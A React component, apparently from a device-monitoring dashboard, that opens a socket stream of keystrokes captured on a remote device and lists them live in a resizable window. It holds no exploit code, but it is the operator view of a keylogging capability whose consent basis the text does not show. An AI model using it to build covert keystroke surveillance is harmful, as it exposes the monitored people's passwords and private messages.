import React, { useState, useEffect } from "react";
import { Rnd } from "react-rnd";
import { useTranslation } from "react-i18next";

import { Grid, Typography, CircularProgress, ListItemIcon } from "@mui/material";

import CloseIcon from "@mui/icons-material/Close";
import RemoveIcon from "@mui/icons-material/Remove";

import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";

const style = {
  display: "flex",
  justifyContent: "center",
  borderRadius: "8px",
  border: "solid 1px #564FEE",
  background: "#212631",
  padding: "20px",
  boxShadow: "0px 4px 10px rgba(0, 0, 0, 0.3)",
};

const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor, onSocketCloseMonitor } = useSocketFunctions();
  const { socket } = useSocket();

  const [state, setState] = useState({
    width: 600,
    height: 500,
    x: 50,
    y: -120,
    minWidth: 400,
    minHeight: 300,
    maxWidth: 700,
    maxHeight: 600,
  });

  const [changeLoading, setChangeLoading] = useState(false);
  const [recieveKeyLogs, setRecieveKeyLogs] = useState("");
  const [keyLogsRow, setKeyLogsRow] = useState([]);
  const [keylogsValue, setKeylogsValue] = useState([]);
  const [hovered, setHovered] = useState(false);

  useEffect(() => {
    init();
  }, []);

  const onKeyMonitorResponse = (data) => {
    const deviceId = device?.deviceId;
    if (deviceId === data.deviceId) {
      setRecieveKeyLogs(data?.keylogs);
      setChangeLoading(false);
    }
  };

  useEffect(() => {
    if (recieveKeyLogs != "") {
      if (recieveKeyLogs === "KeyLogsstart") {
        setKeylogsValue((record) => [...record, [t("devicesPage.monitors.keyLogStart")]]);
      } else {
        let formattedKeyLogs = recieveKeyLogs.substring(1, recieveKeyLogs.length - 1);
        setKeylogsValue((record) => [...record, formattedKeyLogs]);
      }
    }
  }, [recieveKeyLogs]);

  useEffect(() => {
    setKeyLogsRow(keylogsValue);
  }, [keylogsValue]);

  const init = async () => {
    const deviceId = device?.deviceId;
    setChangeLoading(true);
    try {
      if (deviceId) {
        await onSocketMonitor(SocketIOPublicEvents.key_monitor, {
          deviceId,
        });

        // Receive the mic from server
        socket.on(`key-logs-shared-${deviceId}`, onKeyMonitorResponse);

        return () => {
          socket.off(`key-logs-shared-${deviceId}`);
        };
      }
    } catch (error) {
      console.error("Error monitoring device:", error);
      setChangeLoading(false);
    }
  };

  // Close the monitor modal
  const onCloseModal = async () => {
    try {
      setRecieveKeyLogs("");
      setKeyLogsRow([]);

      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  return (
    <MonitorViewer
      initialState={{
        width: 600,
        height: 500,
        x: 50,
        y: -120,
        minWidth: 400,
        minHeight: 300,
        maxWidth: 700,
        maxHeight: 600,
      }}
      onClose={onCloseModal}
    >
      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        <Grid
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            pt: 2,
            position: "relative",
            width: "100%",
            height: "100%",
          }}
        >
          <Typography component="h2" sx={{ color: "#564FEE", mb: 2 }}>
            {monitor?.title}
          </Typography>

          <React.Fragment>
            <Grid
              sx={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
                width: "100%",
                height: "100%",
                overflow: "hidden",
                borderRadius: "5px",
              }}
            >
              <Grid
                sx={{
                  backgroundColor: "#000",
                  width: "100%",
                  height: "500px",
                  p: 1,
                  overflowY: "auto",
                }}
              >
                {changeLoading && (
                  <Grid
                    sx={{
                      position: "absolute",
                      top: 0,
                      left: 0,
                      right: 0,
                      bottom: 0,
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "center",
                      alignItems: "center",
                      zIndex: 1,
                      color: "white",
                      width: "100%",
                    }}
                  >
                    <Grid
                      sx={{
                        display: "flex",
                        justifyContent: "center",
                        alignItems: "center",
                        backgroundColor: "#564FEE",
                        width: "30px",
                        height: "30px",
                        borderRadius: "5px",
                      }}
                    >
                      <CircularProgress sx={{ color: "white" }} size={20} />
                    </Grid>
                  </Grid>
                )}
                {keyLogsRow
                  .slice()
                  .reverse()
                  .map((item, index) => (
                    <Grid key={index} sx={{ gap: "5px", alignItems: "center" }} container>
                      <ListItemIcon sx={{ minWidth: "0px" }}>
                        <RemoveIcon sx={{ color: "#564FEE" }} />
                      </ListItemIcon>
                      <Typography component="h2" sx={{ color: "#564FEE" }}>
                        {item}
                      </Typography>
                    </Grid>
                  ))}
              </Grid>
            </Grid>
          </React.Fragment>
        </Grid>
      </div>
    </MonitorViewer>
  );
};

export default KeyLogsMonitorViewer;
